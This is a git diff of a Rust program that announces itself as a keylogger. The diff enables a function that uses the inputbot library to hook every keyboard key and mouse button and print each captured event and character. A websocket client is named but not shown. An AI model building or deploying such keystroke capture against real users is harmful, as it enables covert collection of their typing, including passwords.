@@ -36,18 +36,19 @@ fn ws_client(event: &str) {
 
 fn main() {
     println!("Keylogger Running");
-    // keyboard_input();
+    keyboard_input();
 
 
-    let device_state = DeviceState::new();
-    let mouse: MouseState = device_state.get_mouse();
-    println!("Current Mouse Coordinates: {:?}", mouse.coords);
-    let keys: Vec<Keycode> = device_state.get_keys();
-    println!("Is A pressed? {}", keys.contains(&Keycode::A));
-    loop {
-        let keys: Vec<Keycode> = device_state.get_keys();
-        println!("Is A pressed? {}", keys.contains(&Keycode::A));
-    }
+    // let device_state = DeviceState::new();
+    // let mouse: MouseState = device_state.get_mouse();
+    // println!("Current Mouse Coordinates: {:?}", mouse.coords);
+    // let keys: Vec<Keycode> = device_state.get_keys();
+    // println!("Is A pressed? {}", keys.contains(&Keycode::A));
+    // loop {
+    //     let keys: Vec<Keycode> = device_state.get_keys();
+    //     println!("{:?}", keys);
+    //     println!("Is A pressed? {}", keys.contains(&Keycode::A));
+    // }
 
 }
 
@@ -83,9 +84,24 @@ fn keyboard_input() {
     // SpaceKey.bind(|| { passthrough_key(" ") });
 
     // AKey.bind(|| { println!("a") });
-    let a: i32 = 0x032;
-    let b: u64 = a as u64;
-    OtherKey(b).bind(|| { println!("Z") });
-    OtherKey(0x041).bind(|| { println!("TEST") });
+    // let a: i32 = 0x032;
+    // let b: u64 = a as u64;
+    // OtherKey(b).bind(|| { println!("Z") });
+    // OtherKey(0x041).bind(|| { println!("TEST") });
+
+    KeybdKey::bind_all(|event| {
+        println!("{:?}", event);
+        match inputbot::from_keybd_key(event) {
+            Some(c) => println!("{c}"),
+            None => println!("Unregistered Key"),
+        };
+    });
+
+    // Bind all mouse buttons to a common callback event.
+    MouseButton::bind_all(|event| {
+        println!("{:?}", event);
+    });
+
+
     handle_input_events();
 }
